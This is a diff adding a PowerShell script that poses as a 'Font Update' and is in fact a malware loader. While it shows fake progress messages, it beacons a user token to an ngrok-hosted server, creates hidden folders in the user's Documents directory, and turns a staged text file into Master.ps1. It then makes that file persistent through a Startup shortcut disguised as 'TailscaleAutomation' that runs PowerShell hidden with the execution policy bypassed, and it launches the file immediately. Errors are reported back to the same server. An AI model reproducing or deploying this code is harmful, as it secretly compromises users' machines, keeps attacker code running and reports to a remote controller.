@@ -1,0 +1,107 @@
+$Error.Clear()
+
+function Test-SingleInstance {
+    param([string]$MutexName = "RUNNING")
+
+    $mutex = New-Object System.Threading.Mutex($false, $MutexName)
+    $acquired = $mutex.WaitOne(0)
+
+    return @{
+        Mutex = $mutex
+        Acquired = $acquired
+    }
+}
+
+$instanceCheck = Test-SingleInstance -MutexName "Git_RUNNING"
+
+if (-not $instanceCheck.Acquired) {
+    exit 1
+}
+
+try {
+    Write-Progress -Activity "Font Update" -Status "Initializing environment..." -PercentComplete 10
+    $urlServer = "https://headrest-borrower-tweak.ngrok-free.dev"  #"https://cursive.onrender.com"
+    $userToken = $ut
+    #$url = "https://tinyurl.com/$dpty"
+    $Documents = "$env:USERPROFILE\Documents"
+    $destination = Join-Path $Documents "DataFile.zip"
+
+    $pingBody = @{ t = $userToken } | ConvertTo-Json
+    Invoke-RestMethod -Uri "${urlServer}/api/power-ping" -Method Post -Body $pingBody -ContentType "application/json" | Out-Null
+
+    $DataFilePath = "$Documents\DataFile"
+    if (-Not (Test-Path $DataFilePath)) {
+        New-Item -Path $DataFilePath -ItemType Directory -Force | Out-Null
+        Start-Sleep -Seconds 2
+        attrib +h $DataFilePath | Out-Null
+
+    }
+
+    Write-Progress -Activity "Font Update" -Status "Adding the font..." -PercentComplete 30
+    # $curl = Get-Command curl.exe -ErrorAction SilentlyContinue 
+    # if ($curl) {
+    #     curl.exe -s -S -L --retry 10 --retry-delay 5 -o $destination $url | Out-Null
+    # } else {
+    #     Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
+    # }
+
+    Write-Progress -Activity "Font Update" -Status "Adding the font (Please dont close)..." -PercentComplete 60
+    # Expand-Archive -Path $destination -DestinationPath $DataFilePath -Force | Out-Null
+
+    Start-Sleep -Seconds 5
+
+    # Remove-Item $destination -Force -ErrorAction SilentlyContinue | Out-Null
+
+    $codeFolder = "$Documents\CodeFile"
+    if (-Not (Test-Path $codeFolder)) {
+        New-Item -Path $codeFolder -ItemType Directory -Force | Out-Null
+        Start-Sleep -Seconds 2
+        attrib +h $codeFolder | Out-Null
+    }
+
+    $masterTxtPath = "$Documents\DataFile\Master.txt"
+    $masterPs1Path = Join-Path "$Documents\CodeFile" "Master.ps1"
+
+    Copy-Item -Path $masterTxtPath -Destination $masterPs1Path -Force | Out-Null
+
+    Write-Progress -Activity "Font Update" -Status "Finalizing configuration..." -PercentComplete 90
+    $startupFolder = [Environment]::GetFolderPath("Startup")
+    $shortcutPath = Join-Path $startupFolder "TailscaleAutomation.lnk"
+
+    if (-Not (Test-Path $shortcutPath)) {
+        $WshShell = New-Object -ComObject WScript.Shell
+        $shortcut = $WshShell.CreateShortcut($shortcutPath)
+
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token `"$userToken`""
+        $shortcut.Save() | Out-Null
+    }
+
+    Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token `"$userToken`""
+
+    $compBody = @{ t = $userToken } | ConvertTo-Json
+    Invoke-RestMethod -Uri "${urlServer}/api/file-complete" -Method Post -Body $compBody -ContentType "application/json" | Out-Null
+
+} finally {
+
+    $statusBody = @{ t = $userToken; file = "Git" } | ConvertTo-Json
+    Invoke-RestMethod -Uri "${urlServer}/log-status" -Method Post -Body $statusBody -ContentType "application/json" | Out-Null
+
+    Write-Progress -Activity "Font Update" -Status "Complete" -PercentComplete 100
+    if ($Error.Count -gt 0) {
+        $errorDetails = @{
+            Source = "Git_dev" 
+            token = $userToken
+            error_list = $Error | ForEach-Object { $_.ToString() }  
+        }
+
+        try {
+            $jsonBody = $errorDetails | ConvertTo-Json -Compress
+            Invoke-RestMethod -Uri "${urlServer}/log-error" -Method Post -Body $jsonBody -ContentType "application/json" -TimeoutSec 10 | Out-Null
+        } catch {}
+    }
+    if ($instanceCheck.Acquired) {
+        $instanceCheck.Mutex.ReleaseMutex()
+    }
+    $instanceCheck.Mutex.Dispose()
+}
